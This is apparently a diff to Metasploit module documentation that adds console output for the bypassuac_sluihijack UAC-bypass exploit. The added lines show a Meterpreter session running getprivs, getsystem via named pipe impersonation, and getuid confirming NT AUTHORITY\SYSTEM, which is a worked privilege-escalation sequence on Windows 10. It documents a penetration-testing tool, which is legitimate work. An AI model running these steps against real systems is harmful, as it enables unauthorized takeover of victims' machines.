@@ -45,7 +45,7 @@ meterpreter > sysinfo
 Computer        : WIN10-01
 OS              : Windows 10 (Build 16299).
 Architecture    : x64
-System Language : ru_RU
+System Language : en_US
 Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
@@ -98,10 +98,42 @@ msf exploit(windows/local/bypassuac_sluihijack) > exploit
 [*] Meterpreter session 2 opened (192.168.0.30:8443 -> 192.168.0.33:49881) at 2018-04-07 18:34:39 +0200
 [*] Cleaining up registry keys ...
 
+meterpreter > getprivs 
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+meterpreter > getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
 meterpreter >
-
-
-
 
 
 ```
